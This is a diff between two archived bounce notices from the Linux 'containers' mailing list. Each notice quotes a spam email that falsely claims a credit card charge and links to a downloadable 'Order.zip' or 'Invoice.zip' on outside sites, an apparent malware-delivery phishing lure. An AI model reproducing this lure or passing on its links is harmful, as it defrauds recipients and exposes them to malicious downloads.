@@ -1,13 +1,13 @@
-From: <postmaster-G+Vgi4iE+l8bIzgrwE/FjQ@public.gmane.org>
-Subject: Undeliverable: SPAM: Your order has been accepted.
-Date: Tue, 15 Nov 2011 08:16:01 +0100
-Message-ID: <14274.8347869658$1321341706@news.gmane.org>
-References: <398534523.20931281730474@uspro545.startdedicated.com>
+From: <postmaster-hN6vG6MiCs1UH/sDrRuVYw@public.gmane.org>
+Subject: Onbestelbaar: Factuur | 227131-060726.
+Date: Tue, 15 Nov 2011 08:38:27 +0100
+Message-ID: <23525.9209447124$1321343047@news.gmane.org>
+References: <0377517652.52083588984258@uspro545.startdedicated.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============6184093095129682863=="
+Content-Type: multipart/mixed; boundary="===============3624059632808361909=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Content-Language: en-US
-In-Reply-To: <398534523.20931281730474-QHT31ff7oBgJ6fTLyRp1Vlc0O+juaISAQQ4Iyu8u01E@public.gmane.org>
+Content-Language: nl-NL
+In-Reply-To: <0377517652.52083588984258-QHT31ff7oBgJ6fTLyRp1Vlc0O+juaISAQQ4Iyu8u01E@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
 List-Archive: <http://lists.linuxfoundation.org/pipermail/containers/>
@@ -20,116 +20,157 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
---===============6184093095129682863==
+--===============3624059632808361909==
 Content-Type: multipart/report; report-type=delivery-status;
-	boundary="49a74142-dcd8-49e9-9f14-3ddde8173930"
-Content-Language: en-US
+	boundary="a21494e3-3cec-465f-84bb-845cde3c599c"
+Content-Language: nl-NL
 
---49a74142-dcd8-49e9-9f14-3ddde8173930
+--a21494e3-3cec-465f-84bb-845cde3c599c
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: quoted-printable
 
-Delivery has failed to these recipients or distribution lists:
+Uw bericht kan niet worden bezorgd bij de volgende personen of distributiel=
+ijsten:
 
-arjan.koudijs-BCtglQhd/FA@public.gmane.org<mailto:arjan.koudijs-BCtglQhd/FA@public.gmane.org>
-The recipient's e-mail address was not found in the recipient's e-mail syst=
-em. Microsoft Exchange will not try to redeliver this message for you. Plea=
-se check the e-mail address and try resending this message, or provide the =
-following diagnostic text to your system administrator.
+aslam-kuo-PXJKpPf5/X8@public.gmane.org<mailto:aslam-kuo-PXJKpPf5/X8@public.gmane.org>
+Het e-mailadres van de geadresseerde is niet gevonden in het e-mailsysteem =
+van de geadresseerde. Microsoft Exchange probeert dit bericht niet opnieuw =
+te verzenden. Controleer het e-mailadres van de geadresseerde en probeer di=
+t bericht nog eens te versturen of geef de volgende diagnosetekst door aan =
+uw systeembeheerder.
 
 ________________________________
-Sent by Microsoft Exchange Server 2007
+Verzonden door Microsoft Exchange Server 2007
 
 
 
 
 
 
-Diagnostic information for administrators:
+Diagnostische gegevens voor beheerders:
 
-Generating server: ZRT.LOCAL
+Bronserver: districon.local
 
-arjan.koudijs-BCtglQhd/FA@public.gmane.org
-#550 5.1.1 RESOLVER.ADR.RecipNotFound; not found ##
+aslam-kuo-PXJKpPf5/X8@public.gmane.org
+#550 5.1.1 RESOLVER.ADR.RecipNotFound; not found ##rfc822;aslam-kuo@dimio.n=
+l
 
-Original message headers:
+Oorspronkelijke berichtkoppen:
 
-Received: from uspro545.startdedicated.com (173.224.125.98) by mail.zrt.nl
- (172.16.3.201) with Microsoft SMTP Server id 8.1.358.0; Tue, 15 Nov 2011
- 08:16:01 +0100
-Received: from [173.224.125.98] by uspro545.startdedicated.com id
-        4AIUzSTqgPOP with SMTP; Tue, 15 Nov 2011 07:15:59 +0000
-Date: Tue, 15 Nov 2011 07:15:59 +0000
-From: Robot <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-X-Mailer: The Bat! (v2.08.4) Personal
+Received: from bsmtp.bit.nl (213.136.12.242) by Districon02.districon.local
+ (192.168.5.12) with Microsoft SMTP Server id 8.1.436.0; Tue, 15 Nov 2011
+ 08:38:26 +0100
+Received: from filter5.filter.dmz.bit.nl (filter5.filter.dmz.bit.nl
+ [172.17.135.35])       by bsmtp.bit.nl (Postfix) with ESMTP id B77AD1C009B=
+F    for
+ <aslam-kuo-PXJKpPf5/X8@public.gmane.org>; Tue, 15 Nov 2011 08:38:26 +0100 (CET)
+Received: from [172.17.134.31] (port=3D46833 helo=3Dmx1.bit.nl)     by
+ filter5.filter.dmz.bit.nl with esmtp (Exim 4.69)       (envelope-from
+ <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)       id 1RQDay-00074L-AW     for
+ aslam-kuo-PXJKpPf5/X8@public.gmane.org; Tue, 15 Nov 2011 08:38:26 +0100
+Received: from [173.224.125.98] (port=3D37719 helo=3Duspro545.startdedicate=
+d.com)
+        by mx1.bit.nl with esmtp (Exim 4.69)    (envelope-from
+ <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)       id 1RQDay-0005Yb-0t     for
+ aslam-kuo-PXJKpPf5/X8@public.gmane.org; Tue, 15 Nov 2011 08:38:16 +0100
+Received: from [173.224.125.98] by uspro545.startdedicated.com id wE6W4UQzY=
+DhQ
+ with SMTP; Tue, 15 Nov 2011 07:38:13 +0000
+Date: Tue, 15 Nov 2011 07:38:13 +0000
+From: PAY <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+X-Mailer: The Bat! (v3.06.9) Home
 X-Priority: 3 (Normal)
-Message-ID: <398534523.20931281730474-QHT31ff7oBgJ6fTLyRp1Vlc0O+juaISAQQ4Iyu8u01E@public.gmane.org>
-To: <arjan.koudijs-BCtglQhd/FA@public.gmane.org>
-Subject: SPAM: Your order has been accepted.
+Message-ID: <0377517652.52083588984258-QHT31ff7oBgJ6fTLyRp1Vlc0O+juaISAQQ4Iyu8u01E@public.gmane.org>
+To: <aslam-kuo-PXJKpPf5/X8@public.gmane.org>
+Subject: Factuur | 227131-060726.
 MIME-Version: 1.0
 Content-Type: text/plain; charset=3D"windows-1252"
 Content-Transfer-Encoding: 8bit
-X-TM-AS-Product-Ver: CSC-0-6.8.1017-18520
-X-TM-AS-Result: Yes-8.23-4.50-31-1
+X-Spam-Level:
+X-Spam-Status: No, score=3D-1.9 required=3D5.0 tests=3DBAYES_00=3D-1.9,FORG=
+ED_RELAY_MUA_TO_MX=3D0.001 autolearn=3Dham version=3D3.3.1-bit_cf
+X-Spam-Checker-Version: SpamAssassin (3.3.0) on filter5.filter.dmz.bit.nl
 Return-Path: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+X-TM-AS-Product-Ver: SMEX-8.0.0.1307-6.500.1024-18520.003
+X-TM-AS-Result: Yes-18.959400-8.000000-31
+X-TM-AS-User-Approved-Sender: No
+X-TM-AS-User-Blocked-Sender: No
 
 
---49a74142-dcd8-49e9-9f14-3ddde8173930
+--a21494e3-3cec-465f-84bb-845cde3c599c
 Content-Type: message/delivery-status
 
-Reporting-MTA: dns;ZRT.LOCAL
-Received-From-MTA: dns;uspro545.startdedicated.com
-Arrival-Date: Tue, 15 Nov 2011 07:16:01 +0000
+Reporting-MTA: dns;districon.local
+Received-From-MTA: dns;bsmtp.bit.nl
+Arrival-Date: Tue, 15 Nov 2011 07:38:26 +0000
 
-Final-Recipient: rfc822;arjan.koudijs-BCtglQhd/FA@public.gmane.org
+Original-Recipient: rfc822;aslam-kuo-PXJKpPf5/X8@public.gmane.org
+Final-Recipient: rfc822;aslam-kuo-PXJKpPf5/X8@public.gmane.org
 Action: failed
 Status: 5.1.1
 Diagnostic-Code: smtp;550 5.1.1 RESOLVER.ADR.RecipNotFound; not found
 
 
---49a74142-dcd8-49e9-9f14-3ddde8173930
+--a21494e3-3cec-465f-84bb-845cde3c599c
 Content-Type: message/rfc822
 
-Received: from uspro545.startdedicated.com (173.224.125.98) by mail.zrt.nl
- (172.16.3.201) with Microsoft SMTP Server id 8.1.358.0; Tue, 15 Nov 2011
- 08:16:01 +0100
-Received: from [173.224.125.98] by uspro545.startdedicated.com id
- 	4AIUzSTqgPOP with SMTP; Tue, 15 Nov 2011 07:15:59 +0000
-Date: Tue, 15 Nov 2011 07:15:59 +0000
-From: Robot <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-X-Mailer: The Bat! (v2.08.4) Personal
+Received: from bsmtp.bit.nl (213.136.12.242) by Districon02.districon.local
+ (192.168.5.12) with Microsoft SMTP Server id 8.1.436.0; Tue, 15 Nov 2011
+ 08:38:26 +0100
+Received: from filter5.filter.dmz.bit.nl (filter5.filter.dmz.bit.nl
+ [172.17.135.35])	by bsmtp.bit.nl (Postfix) with ESMTP id B77AD1C009BF	for
+ <aslam-kuo-PXJKpPf5/X8@public.gmane.org>; Tue, 15 Nov 2011 08:38:26 +0100 (CET)
+Received: from [172.17.134.31] (port=46833 helo=mx1.bit.nl)	by
+ filter5.filter.dmz.bit.nl with esmtp (Exim 4.69)	(envelope-from
+ <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)	id 1RQDay-00074L-AW	for
+ aslam-kuo-PXJKpPf5/X8@public.gmane.org; Tue, 15 Nov 2011 08:38:26 +0100
+Received: from [173.224.125.98] (port=37719 helo=uspro545.startdedicated.com)
+	by mx1.bit.nl with esmtp (Exim 4.69)	(envelope-from
+ <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)	id 1RQDay-0005Yb-0t	for
+ aslam-kuo-PXJKpPf5/X8@public.gmane.org; Tue, 15 Nov 2011 08:38:16 +0100
+Received: from [173.224.125.98] by uspro545.startdedicated.com id wE6W4UQzYDhQ
+ with SMTP; Tue, 15 Nov 2011 07:38:13 +0000
+Date: Tue, 15 Nov 2011 07:38:13 +0000
+From: PAY <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+X-Mailer: The Bat! (v3.06.9) Home
 X-Priority: 3 (Normal)
-Message-ID: <398534523.20931281730474-QHT31ff7oBgJ6fTLyRp1Vlc0O+juaISAQQ4Iyu8u01E@public.gmane.org>
-To: <arjan.koudijs-BCtglQhd/FA@public.gmane.org>
-Subject: SPAM: Your order has been accepted.
+Message-ID: <0377517652.52083588984258-QHT31ff7oBgJ6fTLyRp1Vlc0O+juaISAQQ4Iyu8u01E@public.gmane.org>
+To: <aslam-kuo-PXJKpPf5/X8@public.gmane.org>
+Subject: Factuur | 227131-060726.
 MIME-Version: 1.0
 Content-Type: text/plain; charset="windows-1252"
 Content-Transfer-Encoding: quoted-printable
-X-TM-AS-Product-Ver: CSC-0-6.8.1017-18520
-X-TM-AS-Result: Yes-8.23-4.50-31-1
+X-Spam-Level: 
+X-Spam-Status: No, score=-1.9 required=5.0 tests=BAYES_00=-1.9,FORGED_RELAY_MUA_TO_MX=0.001 autolearn=ham version=3.3.1-bit_cf
+X-Spam-Checker-Version: SpamAssassin (3.3.0) on filter5.filter.dmz.bit.nl
 Return-Path: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+X-TM-AS-Product-Ver: SMEX-8.0.0.1307-6.500.1024-18520.003
+X-TM-AS-Result: Yes-18.959400-8.000000-31
+X-TM-AS-User-Approved-Sender: No
+X-TM-AS-User-Blocked-Sender: No
 
 
 
 
-Goeie morgen.
+Hallo
 
-Dank u voor de bestelling,
-uw creditcard in rekening gebracht voor 278 dollar.
-Voor meer informatie kunt u terecht op onze website:
-http://littlema.com/clientedown/Order.zip?id:052047383Generation_user=3Darj=
-an.koudijs-BCtglQhd/FA@public.gmane.org
+Thank you for the order,=20
 
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D
+your credit card will be charged for 218 dollars.
+For more information, please visit our web site:
+http://damianofrutta.it/clientedown/Invoice.zip?id:30799Generation_user=3Da=
+slam-kuo-PXJKpPf5/X8@public.gmane.org
+
+
+____________
 Best regards, ticket service.
-Tel./Fax.: +31 (30) 392-24-15.
+Tel./Fax.: +31 (30) 801-98-11.
 
 
 
---49a74142-dcd8-49e9-9f14-3ddde8173930--
+--a21494e3-3cec-465f-84bb-845cde3c599c--
 
---===============6184093095129682863==
+--===============3624059632808361909==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -139,4 +180,4 @@ _______________________________________________
 Containers mailing list
 Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============6184093095129682863==--
+--===============3624059632808361909==--
